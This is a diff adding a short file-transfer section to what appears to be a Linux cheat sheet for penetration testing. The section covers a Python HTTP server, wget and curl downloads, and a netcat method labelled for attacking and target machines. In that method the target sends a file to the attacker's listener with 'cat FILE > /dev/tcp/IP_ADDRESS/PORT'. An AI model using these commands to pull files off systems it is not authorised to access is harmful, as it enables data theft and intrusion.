@@ -73,3 +73,25 @@ sort -n <file>
 Sort: sort <file>
 Sort (in reverse): sort -r <file>
 Sort (numerically): sort -n <file>
+## Serving a File
+### Python Method
+Creating the File Server:
+```bash
+sudo python -m http.server 80
+```
+Downloading the File:
+```bash
+wget http://IP_ADDRESS:80/FILE
+```
+```bash
+curl http://IP_ADDRESS:80/filename -o filename
+```
+### Netcat Method
+Attacking Machine:
+```bash
+nc -lvnp PORT > FILE
+```
+Target Machine:
+```bash
+cat FILE > /dev/tcp/IP_ADDRESS/PORT
+```
